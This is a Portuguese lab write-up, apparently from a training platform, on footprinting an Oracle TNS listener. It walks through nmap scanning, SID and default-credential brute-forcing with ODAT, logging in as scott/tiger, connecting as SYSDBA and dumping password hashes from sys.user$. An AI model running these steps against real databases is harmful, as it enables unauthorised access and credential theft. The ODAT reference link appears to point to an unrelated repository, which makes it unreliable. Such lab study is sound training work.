# 🏴️ ORACLE TNS — Estudo Footprinting

---

## Enumeração

### 1. Scan Oracle TNS

Aqui estou fazendo um scan inicial para identificar o serviço Oracle TNS e sua versão.

```
sudo nmap -p1521 -sV 10.129.97.235 --open
```

**Retorno:**

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-19 13:50 CDT
Nmap scan report for 10.129.97.235
Host is up (0.0073s latency).

PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.42 seconds
```

**Informações coletadas:**
- Versão: Oracle TNS listener 11.2.0.2.0
- Porta: 1521/TCP

### 2. Enumeração ODAT - SIDs e Service Names

Agora vou utilizar o ODAT (Oracle Database Attacking Tool) para enumerar SIDs e service names válidos.

```
./odat.py all -s 10.129.97.235
```

**Retorno:**

```
[+] Target: 10.129.97.235:1521 [all]
[+] Checking if target 10.129.97.235:1521 is well configured for a connection...
[+] According to a test, the TNS listener 10.129.97.235:1521 is well configured. Continue...

[1] (10.129.97.235:1521): Is it vulnerable to TNS poisoning (CVE-2012-1675)?
[+] Impossible to know if target is vulnerable to a remote TNS poisoning because SID is not given.

[2] (10.129.97.235:1521): Searching valid SIDs
[2.1] Searching valid SIDs thanks to a well known SID list on the 10.129.97.235:1521 server
[+] 'XE' is a valid SID. Continue...                                                                                          
100% |#######################################################################################################| Time: 00:00:12 
[2.2] Searching valid SIDs thanks to a brute-force attack on 1 chars now (10.129.97.235:1521)
100% |#######################################################################################################| Time: 00:00:00 
[2.3] Searching valid SIDs thanks to a brute-force attack on 2 chars now (10.129.97.235:1521)
[+] 'XE' is a valid SID. Continue...                                                                                          
100% |#######################################################################################################| Time: 00:00:11 
[+] SIDs found on the 10.129.97.235:1521 server: XE

[3] (10.129.97.235:1521): Searching valid Service Names
[3.1] Searching valid Service Names thanks to a well known Service Name list on the 10.129.97.235:1521 server
[+] 'XE' is a valid Service Name. Continue...                                                                                 
[+] 'XEXDB' is a valid Service Name. Continue...                                                                              
100% |#######################################################################################################| Time: 00:00:14
[+] Service Name(s) found on the 10.129.97.235:1521 server: XE,XEXDB
```

**Informações coletadas:**
- SID válido: XE
- Service Names: XE, XEXDB

### 3. Enumeração ODAT - Credentials

Continuando com o ODAT para verificar credenciais padrão.

```
./odat.py all -s 10.129.97.235
```

**Retorno:**

```
[4] (10.129.97.235:1521): Searching valid accounts on the XE SID
[!] Notice: 'ctxsys' account is locked, so skipping this username for password
[!] Notice: 'dbsnmp' account is locked, so skipping this username for password
...
[+] Valid credentials found: scott/tiger. Continue...
...
[+] Accounts found on 10.129.97.235:1521/sid:XE: 
scott/tiger
```

**Informações coletadas:**
- Credenciais encontradas: scott/tiger

### 4. Conexão SQLPlus

Encontrei as credenciais scott/tiger. Agora vou me conectar via sqlplus a base de dados com a credencial que encontrei anteriormente.

```
sqlplus scott/tiger@10.129.97.235/XE
```

**Retorno:**

```
SQL*Plus: Release 19.0.0.0.0 - Production on Tue May 19 14:06:55 2026
Version 19.6.0.0.0

Copyright (c) 1982, 2019, Oracle.  All rights reserved.

ERROR:
ORA-28002: the password will expire within 7 days

Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
```

**Informações coletadas:**
- Conexão estabelecida com o banco Oracle 11g XE

### 5. Enumeração de Tabelas

Procurando por tabelas disponíveis.

```
select table_name from all_tables;
```

**Retorno:**

```
TABLE_NAME
------------------------------
DUAL
SYSTEM_PRIVILEGE_MAP
TABLE_PRIVILEGE_MAP
...
DEPT
EMP
BONUS
SALGRADE
...

75 rows selected.
```

### 6. Verificação de Permissões

Verificando quais permissões o usuário scott tem.

```
select * from user_role_privs;
```

**Retorno:**

```
USERNAME		       GRANTED_ROLE		      ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SCOTT			       CONNECT			      NO  YES NO
SCOTT			       RESOURCE 		      NO  YES NO
```

### 7. Conexão como SYSDBA

Como não encontrei nada, vou tentar me conectar ao banco com as mesmas credenciais mas tentando me conectar como sysdba.

```
sqlplus scott/tiger@10.129.97.235/XE as sysdba
```

**Retorno:**

```
SQL*Plus: Release 19.0.0.0.0 - Production on Tue May 19 14:08:51 2026
Version 19.6.0.0.0

Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
```

### 8. Enumeração de Hashes de Senha

Buscando por nome e senha dos usuários.

```
select name,password from sys.user$;
```

**Retorno:**

```
NAME			       PASSWORD
------------------------------ ------------------------------
SYS			       FBA343E7D6C8BC9D
...
SYSTEM			       B5073FE1DE351687
...
DBSNMP			       E066D214D5421CCC
...
CTXSYS			       D1D21CA56994CAB6
...
XDB			       E76A6BD999EF9FF1
...
SCOTT			       F894844C34402B67

51 rows selected.
```

**Informações coletadas:**
- Hash de senha do usuário DBSNMP encontrado: E066D214D5421CCC
- Diversos usuários do sistema com hashes

---

## Resumo

| Campo | Valor |
|:------|:------|
| **Versão** | Oracle TNS listener 11.2.0.2.0 |
| **Porta** | 1521/TCP |
| **SID válido** | XE |
| **Service Names** | XE, XEXDB |
| **Credenciais** | scott/tiger |
| **Usuários enumerados** | SYS, SYSTEM, DBSNMP, CTXSYS, XDB, SCOTT |
| **CVE** | CVE-2012-1675 (TNS poisoning) |
| **Ferramentas** | nmap, ODAT, sqlplus |

---

## Referências

- [ODAT - Oracle Database Attacking Tool](https://github.com/0xdea/exploits/tree/master/systems/oracle)
- [Oracle TNS Listener Documentation](https://docs.oracle.com/database/121/NETRF/title.htm)
- [CVE-2012-1675](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-1675)